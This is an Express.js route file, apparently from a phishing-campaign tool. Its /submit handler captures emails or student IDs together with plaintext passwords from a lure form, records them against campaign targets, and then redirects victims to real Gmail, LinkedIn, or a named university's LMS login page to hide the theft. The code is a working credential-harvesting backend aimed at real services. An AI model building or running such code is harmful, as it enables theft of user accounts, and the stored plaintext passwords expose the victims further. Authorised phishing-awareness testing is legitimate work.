import { Router } from 'express';
import { nanoid } from 'nanoid';
import { getDb } from '../utils/db.js';

const router = Router();

router.post('/submit', async (req, res) => {
  try {
    const { email, student_id, password, campaign_id, target_id } = req.body;
    const identifier = student_id || email;

    const PLACEHOLDERS = new Set(['TARGET_ID_PLACEHOLDER', 'CAMPAIGN_ID_PLACEHOLDER']);
    if (!identifier || !campaign_id || !target_id) {
      return res.status(400).json({ error: 'Missing required fields' });
    }
    if (PLACEHOLDERS.has(target_id) || PLACEHOLDERS.has(campaign_id)) {
      return res.status(400).json({ error: 'Invalid campaign or target ID' });
    }

    const db = await getDb();
    const timestamp = new Date().toISOString();
    const campaign = db.data.campaigns.find((c) => c.id === campaign_id);
    const isUniversity = campaign?.template === 'university';

    const eventRecord = {
      id: nanoid(),
      target_id,
      campaign_id,
      event: 'credentials_submitted',
      timestamp,
    };

    if (isUniversity || student_id) {
      eventRecord.student_id = student_id || identifier;
    } else {
      eventRecord.email = email || identifier;
    }
    if (password) {
      eventRecord.password = password;
    }

    db.data.events.push(eventRecord);

    const target = db.data.targets.find(
      (t) => t.id === target_id && t.campaign_id === campaign_id
    );

    if (target) {
      target.submitted = true;
      target.submit_time = timestamp;
      target.submitted_password = password || null;
      if (isUniversity || student_id) {
        target.submitted_student_id = student_id || identifier;
        target.submitted_email = null;
      } else {
        target.submitted_email = email || identifier;
        target.submitted_student_id = null;
      }
    }

    await db.write();

    const template = campaign?.template || 'gmail';

    const redirects = {
      gmail: 'https://mail.google.com',
      university: 'https://lms.kiet.edu.pk/kietlms/login/index.php',
      corporate: 'https://www.linkedin.com',
    };

    res.json({ redirect: redirects[template] || 'https://www.google.com' });
  } catch (err) {
    console.error('Submit error:', err);
    res.status(500).json({ error: 'Submission failed' });
  }
});

export default router;
